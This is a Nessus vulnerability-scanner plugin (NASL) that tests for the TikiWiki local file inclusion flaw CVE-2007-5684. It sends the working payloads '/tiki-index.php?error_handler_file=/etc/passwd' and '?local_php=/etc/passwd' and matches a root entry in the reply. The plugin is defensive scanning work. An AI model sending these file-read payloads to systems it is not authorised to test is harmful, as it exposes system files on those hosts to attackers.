#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(27575);
  script_version("1.19");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2007-5684");
  script_bugtraq_id(26211);

  script_name(english:"TikiWiki < 1.9.8.2 Multiple Scripts Local File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to one
or more local file include attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running TikiWiki, an open source wiki application
written in PHP.

The version of TikiWiki installed on the remote host fails to sanitize
input to the 'error_handler_file' and/or 'local_php' parameters before
using them to include PHP code.  Provided PHP's 'register_globals'
setting is enabled, an unauthenticated, remote attacker may be able to
exploit this issue to view arbitrary files or to execute arbitrary PHP
code on the remote host, subject to the privileges of the web server
user id.");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/482801/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"https://tiki.org/tiki-read_article.php?articleId=15");
  script_set_attribute(attribute:"solution", value:
"Upgrade to TikiWiki version 1.9.8.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_cwe_id(22);

  script_set_attribute(attribute:"plugin_publication_date", value:"2007/10/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:tikiwiki:tikiwiki");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("tikiwiki_detect.nasl");
  script_require_keys("www/PHP", "www/tikiwiki");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("data_protection.inc");

port = get_http_port(default:80,php:TRUE);

file = "/etc/passwd";
if (thorough_tests)
{
  exploits = make_list(
    string("/tiki-index.php?error_handler_file=", file),
    string("/tiki-index.php?local_php=", file)
  );
}
else
{
  exploits = make_list(
    string("/tiki-index.php?error_handler_file=", file)
  );
}

install = get_install_from_kb(appname:'tikiwiki', port:port, exit_on_fail:TRUE);
dir = install['dir'];

foreach exploit (exploits)
{
  # Try to retrieve a local file.
  w = http_send_recv3(method:"GET", item:string(dir , exploit), port:port);
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    contents = res - strstr(res, "<br />");
    contents = data_protection::redact_etc_passwd(output:contents);
    report = string(
      "\n",
      "Here are the contents of the file '/etc/passwd' that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      contents
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
